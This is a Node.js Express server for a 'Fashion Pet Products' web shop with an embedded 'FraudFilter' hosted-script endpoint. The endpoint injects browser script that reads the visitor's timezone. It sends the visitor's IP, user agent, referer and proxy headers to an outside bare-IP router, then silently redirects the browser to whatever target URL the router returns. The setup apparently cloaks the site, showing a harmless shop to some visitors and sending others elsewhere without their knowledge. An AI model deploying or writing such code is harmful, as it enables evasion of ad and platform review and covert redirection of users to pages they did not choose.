import express from "express";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

app.set("trust proxy", true);

const PORT = process.env.PORT || 3000;
const distPath = path.join(__dirname, "dist");

/*
 * FraudFilter Hosted JavaScript endpoint
 *
 * URL:
 * https://fashionpetproducts-ff15ee5849eb.herokuapp.com/?id=ompnv
 *
 * Campaign:
 * ompnv
 *
 * FraudFilter Router:
 * http://130.211.20.155
 */

app.get("/", async (req, res, next) => {
  if (req.query.id !== "ompnv") {
    return next();
  }

  res.type("application/javascript");

  res.set(
    "Cache-Control",
    "no-store, no-cache, must-revalidate, max-age=0"
  );

  /*
   * FraudFilter requires the visitor timezone.
   *
   * First request loads this small bootstrap script.
   * It reloads the same Hosted JS URL with:
   *
   * tzzzr=0
   * tzzz=<visitor timezone offset>
   */

  if (!req.query.tzzz) {
    const scriptUrl =
      `${req.protocol}://${req.get("host")}${req.originalUrl}`;

    const separator = scriptUrl.includes("?") ? "&" : "?";

    const bootstrapScript = `
(function() {
  try {
    var scriptUrl = ${JSON.stringify(scriptUrl)};
    var separator = scriptUrl.indexOf("?") !== -1 ? "&" : "?";

    scriptUrl =
      scriptUrl +
      separator +
      "tzzzr=0&tzzz=" +
      encodeURIComponent(String(-new Date().getTimezoneOffset()));

    var s = document.createElement("script");
    s.src = scriptUrl;
    s.async = false;

    if (document.currentScript && document.currentScript.parentNode) {
      document.currentScript.parentNode.insertBefore(
        s,
        document.currentScript.nextSibling
      );
    } else {
      document.head.appendChild(s);
    }
  } catch (e) {}
})();
`;

    return res.send(bootstrapScript);
  }

  try {
    /*
     * Get visitor IP.
     */

    const forwardedFor =
      req.headers["x-forwarded-for"] || "";

    const remoteAddr =
      forwardedFor ||
      req.ip ||
      req.socket?.remoteAddress ||
      "";

    const firstIp = String(remoteAddr)
      .split(",")[0]
      .trim();

    /*
     * Send visitor information to FraudFilter.
     */

    const response = await fetch(
      "http://130.211.20.155/ompnv",
      {
        method: "POST",

        headers: {
          "content-length": "0",

          "X-FF-JS-TOKEN":
            process.env.FRAUDFILTER_HOSTED_JS_TOKEN || "",

          "X-FF-REMOTE-ADDR":
            firstIp,

          "X-FF-REFERER":
            req.get("referer") || "",

          "X-FF-HOST":
            req.get("host") || "",

          "X-FF-QUERY-STRING":
            req.originalUrl.split("?")[1] || "",

          "X-FF-REQUEST-URI":
            req.originalUrl,

          "User-Agent":
            req.get("user-agent") || "",

          "Expected":
            "",

          "X-FF-TZ-OFFSET":
            String(req.query.tzzz || ""),

          "X-FF-X-FORWARDED-FOR":
            req.headers["x-forwarded-for"] || "",

          "X-FF-CF-CONNECTING-IP":
            req.headers["cf-connecting-ip"] || "",

          "X-FF-X-REAL-IP":
            req.headers["x-real-ip"] || ""
        }
      }
    );

    const output = await response.text();

    console.log(
      "FraudFilter HTTP status:",
      response.status
    );

    console.log(
      "FraudFilter response:",
      output
    );

    /*
     * FraudFilter response format:
     *
     * 1;type;target
     * 0;type;target
     */

    const parts = output
      .trim()
      .split(";", 3);

    if (parts.length < 3) {
      console.log(
        "FraudFilter: invalid response"
      );

      return res.send(
        "(function(){});"
      );
    }

    const result =
      parts[0] === "1";

    const target =
      parts[2];

    console.log(
      "FraudFilter result:",
      result
    );

    console.log(
      "FraudFilter target:",
      target
    );

    /*
     * FraudFilter says redirect.
     */

    if (result && target) {
      return res.send(
        `(function(){
          try {
            window.location.replace(${JSON.stringify(target)});
          } catch(e) {
            try {
              window.location.href=${JSON.stringify(target)};
            } catch(e2) {}
          }
        })();`
      );
    }

    /*
     * FraudFilter says allow / no redirect.
     */

    return res.send(
      "(function(){});"
    );

  } catch (error) {

    console.error(
      "FraudFilter error:",
      error
    );

    /*
     * Fail safely if FraudFilter is unavailable.
     */

    return res
      .type("application/javascript")
      .send("(function(){});");
  }
});

/*
 * Serve Vite production files
 */

app.use(
  express.static(distPath)
);

/*
 * React fallback
 */

app.use((req, res) => {
  res.sendFile(
    path.join(
      distPath,
      "index.html"
    )
  );
});

/*
 * Start server
 */

app.listen(
  PORT,
  "0.0.0.0",
  () => {
    console.log(
      `Fashion Pet Products running on port ${PORT}`
    );
  }
);
